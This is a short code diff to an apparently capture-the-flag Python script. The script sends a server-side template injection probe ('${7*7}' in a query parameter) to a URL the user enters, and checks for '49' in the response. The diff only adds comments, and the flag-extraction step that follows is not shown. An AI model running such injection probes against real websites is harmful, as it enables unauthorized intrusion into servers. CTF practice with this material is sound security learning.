@@ -1,6 +1,7 @@
 import requests
-
+# Ask for target URL
 url = input("🔗 Please enter the website URL ")
+# Add http:// if missing
 if not url.startswith("https://") and not url.startswith("http://"):
     url = "http://" + url
 else:
@@ -12,7 +13,7 @@ testing = f"{url}?text=${{7*7}}"
 try:
     res = requests.get(testing)
     response_text = res.text
-
+#
     if "49" in response_text:
         print("✅ Successful SSTI injection! Woah!")
         print("Now I will try to extract the flag. Watch and learn.")
